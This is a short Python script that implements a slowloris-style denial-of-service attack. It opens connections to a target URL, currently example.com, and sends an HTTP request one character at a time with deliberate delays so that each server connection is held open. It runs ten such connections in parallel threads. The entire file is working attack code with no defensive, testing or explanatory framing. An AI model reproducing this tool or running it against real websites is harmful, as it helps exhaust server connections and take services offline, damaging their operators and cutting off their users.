import socket
import ssl
import time
from urllib.parse import urlparse
import concurrent.futures


def loris(url, delay):
    parsed_url = urlparse(url)
    if parsed_url.scheme == 'https':
        port = 443
        use_ssl = True
    else:
        port = 80
        use_ssl = False
    if parsed_url.path:
        request_path = parsed_url.path
    else:
        request_path = '/'
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect((parsed_url.hostname, port))
        if use_ssl:
            ssl_socket = ssl.wrap_socket(client_socket)
        else:
            ssl_socket = client_socket
        request = f"GET {request_path} HTTP/1.1\r\nHost: {parsed_url.hostname}\r\n\r\n"
        for character in request:
            ssl_socket.sendall(character.encode())
            time.sleep(delay)
        response = ssl_socket.recv(4096)
        return True
    except ConnectionRefusedError:
        return False
    finally:
        if use_ssl:
            ssl_socket.close()
        client_socket.close()
def run_loris():
    website_url = 'https://www.example.com'
    character_delay = 2
    result = loris(website_url, character_delay)
    if result:
        print("works")
    else:
        print("failed")
num_threads = 10
with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
    futures = [executor.submit(run_loris) for _ in range(num_threads)]
    concurrent.futures.wait(futures)